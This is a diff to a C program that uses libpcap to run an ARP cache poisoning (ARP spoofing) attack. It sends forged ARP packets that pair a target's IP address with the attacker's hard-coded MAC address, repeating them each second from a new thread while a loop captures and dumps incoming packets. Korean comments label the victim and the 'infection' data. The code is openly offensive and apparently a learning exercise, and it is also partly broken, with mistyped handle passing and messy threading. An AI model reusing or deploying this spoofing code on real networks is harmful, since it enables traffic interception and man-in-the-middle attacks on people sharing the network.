@@ -10,6 +10,9 @@
 // #include<linux/if_arp.h>
 #include <netinet/in.h>
 #include <netinet/ether.h>
+
+#include <pthread.h>
+
 // #include <linux/if_arp.h>
 // #include<net/ethernet.h>
 // #include <net/if_arp.h>
@@ -31,6 +34,13 @@ typedef struct fullarp {
     struct arp_hdr arp_hdr;
 } fullarphdr;
 
+typedef struct arpInfo {
+    struct pcap_pkthdr header;
+    pcap_t *handle;
+    struct sockaddr_in sender;
+    struct sockaddr_in target;
+} arp_info;
+
 void USARTWrite(const void *object, size_t size)
 {
     const unsigned char *byte;
@@ -46,7 +56,16 @@ void USARTWrite(const void *object, size_t size)
     putchar('\n');
 }
 
-void arpInfection(struct pcap_pkthdr header, pcap_t **handle, char *sender, char *target)    {
+void *arpInfectionPlt(arp_info *arpInfo)    {
+    printf("\nsender : %d \n", arpInfo -> sender.sin_addr);
+    printf("\nntarget : %d \n", arpInfo -> target.sin_addr);
+    arpInfection(arpInfo -> header, arpInfo -> handle, &(arpInfo -> sender), &(arpInfo -> target));
+}
+
+void arpInfection(struct pcap_pkthdr header, pcap_t **handle, struct sockaddr_in *sender, struct sockaddr_in *target)    {
+
+    printf("\nsender : %d \n", sender -> sin_addr);
+    printf("\nntarget : %d \n", target -> sin_addr);
 
     char *recvPacket;
 
@@ -61,9 +80,10 @@ void arpInfection(struct pcap_pkthdr header, pcap_t **handle, char *sender, char
     fullarp.arp_hdr.plen = 4;
     fullarp.arp_hdr.oper = htons(ARPOP_REQUEST);
     memcpy(fullarp.arp_hdr.sha, "\xf4\x8c\x50\x8c\xda\xc0", 6); // 내 맥주소
-    memcpy(fullarp.arp_hdr.spa, target, 4); // 감염 데이터 ( target )
+    // fullarp.arp_hdr.spa = sender.sin_addr;
+    memcpy(fullarp.arp_hdr.spa, &target -> sin_addr, 4); // 감염 데이터 ( target )
     memcpy(fullarp.arp_hdr.tha, "\x00\x00\x00\x00\x00\x00", 6);
-    memcpy(fullarp.arp_hdr.tpa, sender, 4); // 공격 당하는 사람
+    memcpy(fullarp.arp_hdr.tpa, &sender -> sin_addr, 4); // 공격 당하는 사람
 
     unsigned char* ptr;
     ptr = (unsigned char*)&fullarp;
@@ -73,7 +93,7 @@ void arpInfection(struct pcap_pkthdr header, pcap_t **handle, char *sender, char
     if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
     {
         printf("Error sending the packet: %s\n", pcap_geterr(handle));
-        return 2;
+        return;
     }
 
     char senderMac[7];
@@ -94,9 +114,9 @@ void arpInfection(struct pcap_pkthdr header, pcap_t **handle, char *sender, char
         if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
         {
             printf("Error sending the packet: %s\n", pcap_geterr(handle));
-            return 2;
+            return;
         }
-        puts("Go");
+        puts("ARP 감염 패킷 보냄");
         sleep(1);
     }
 }
@@ -129,10 +149,43 @@ int main(int argc, char const *argv[]) {
   /* Error 제어 { */
     if(dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
     if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) { fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf); net = 0; mask = 0; }
-    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if(handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
   /*}*/
 
-    arpInfection(header, handle, &sender.sin_addr, &target.sin_addr);
+
+    struct arpInfo arpInfo;
+    arpInfo.header = header;
+    arpInfo.handle = handle;
+    arpInfo.sender = sender;
+    arpInfo.target = target;
+
+    printf("\nSender : %d\n", sender.sin_addr);
+    printf("\nTarget : %d\n", target.sin_addr);
+
+    pthread_t tid;
+    pthread_create(&tid, NULL, arpInfectionPlt, &arpInfo);
+    // pthread_join(tid, NULL);
+
+    int chk = 0;
+    char *recvPacket;
+
+    while(1) {
+    	chk = pcap_next_ex(handle, &header, &recvPacket);
+		if(chk != 1 ) continue;
+        USARTWrite(recvPacket, 60);
+    }
+
+
+    // How to Thread,,,?xl
+    // pid_t pid;
+    // struct pcap_pkthdr header;
+    // pcap_t *handle;
+    // struct sockaddr_in sender;
+    // struct sockaddr_in target;
+
+    // pthread_create(&tr, NULL, arpInfection, (void *)args);
+    // arpInfection(header, handle, &sender.sin_addr, &target.sin_addr);
+
     return 0;
 }
